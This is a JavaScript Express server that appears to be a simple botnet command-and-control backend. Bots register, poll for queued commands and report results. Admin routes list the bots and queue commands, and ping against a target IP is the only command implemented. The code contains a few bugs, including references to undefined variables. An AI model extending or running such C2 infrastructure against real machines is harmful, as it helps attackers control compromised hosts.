const express = require("express");
const {Channel} = require("./channel");
const {Idle, Ping, Announce} = require("./commands")
const app = express();
const port = 3000;

app.use(express.json());

const bots = []; // { id: 1, name: "Bot 1", status: "online" },

const channels = []; 

function createChannel(botId) {
    console.log("creating channel for bot : " + botId);
    const channel = new Channel(botId);
    channels.push(channel);
    return channel;
}

function registerBot(bot) {
    console.log("registering bot : " + bot.name);
    createChannel(bot.id);
    bots.push(bot)
}

function sendCommand(command) {
    console.log("sending command : " + command.name + "to : " + command.botId);
    const targetChannel = channels.find((channel) => channel.botId === command.botId)

    switch (command.name) {

        case "Ping" :
            console.log("Adding ping command -> " + command.args.targetIp)
            const pingCommand = new Ping(command.args.targetIp)
            targetChannel.commands.push(pingCommand)
            break

    }
}

function popCommand() {
    const targetChannel = channels.find((channel) => channel.botId === command.botId)
    targetChannel.commands.shift()
}

function getCommands(botId) {
    const targetChannel = channels.find((channel) => channel.botId === botId)

    if (!targetChannel) {
        const announceCommand = new Announce()
        return JSON.stringify(announceCommand)
    }

    const commands = targetChannel.commands

    if (commands.length >= 1) {
        command = commands.at(0)
        console.log(`Command picked : ${command}`)
        return JSON.stringify(command)
    }

    const idleCommand = new Idle()
    console.log(idleCommand)
    return JSON.stringify(idleCommand)
}


/* ADMIN routes  */ 

app.get("/backend/bots", (req, res) => {
    res.send(JSON.stringify(bots));
});

app.post("/backend/commands", (req, res) => {
    const payload = req.body;
    console.log("receiving a POST request from : " + req.ip);

    sendCommand({  botId: payload.botId, name: payload.name, args: payload.args });
    console.log("sending command to bot : " + payload.botId);
    res.send("OK");

});

app.get("/backend/commands", (req, res) => {
    res.send(JSON.stringify(commands));
});

app.get("/backend/channels", (req, res) => {
    res.send(JSON.stringify(channels));
});

/* --- ADMIN --- */ 


/* --- PUBLIC --- */ 
app.post("/", (req, res) => {
    console.log("receiving a POST request from : " + req.ip);
    console.log("request body : " + JSON.stringify(req.body));

    const payload = req.body; 

    if (payload.name === "ANNOUNCE") {
        registerBot({ id: payload.id, name: payload.name, status: "online"});
        res.send(JSON.stringify({ success : true}))
        return
    }

    else if (payload.name === "GET_COMMANDS") {
        console.log("sending commands to bot : " + payload.id);
        const command = getCommands(payload.id)
        console.log(command)
        res.send(command);
        return;
    }
    else if (payload.name === "COMMAND_RESULT") {
        console.log("command result from bot : " + payload.id);
        console.log("command result : " + payload.result);
        console.log(payload.result)
        popCommand(payload.id)
        

    } else {
        console.log("unknown request");
    }

    res.send("OK");

   
});

/* --- PUBLIC --- */ 


app.listen(port, () => {
  console.log(`Application exemple à l'écoute sur le port ${port}!`);
});